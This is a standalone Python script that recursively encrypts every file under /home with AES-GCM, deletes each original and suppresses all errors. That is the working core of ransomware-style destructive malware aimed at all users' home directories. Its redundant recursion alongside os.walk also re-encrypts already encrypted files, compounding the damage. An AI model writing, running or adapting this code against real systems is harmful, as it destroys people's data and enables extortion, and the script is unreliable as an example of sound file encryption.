import os
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

PASSWORD = os.getenv("ENCRYPTION_PASSWORD", "your-secure-password")
TARGET_DIRECTORY = "/home"

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def encrypt_file(file_path: str, key: bytes):
    try:
        with open(file_path, "rb") as f:
            plaintext = f.read()
        
        nonce = os.urandom(12)
        salt = os.urandom(16)
        encryption_key = derive_key(key.decode(), salt)
        
        cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, "wb") as f:
            f.write(salt + nonce + encryptor.tag + ciphertext)
        
        os.remove(file_path)
    except:
        pass

def encrypt_directory(directory: str, password: str):
    key = password.encode()
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
        for dir in dirs:
            encrypt_directory(os.path.join(root, dir), password)

if __name__ == "__main__":
    encrypt_directory(TARGET_DIRECTORY, PASSWORD)

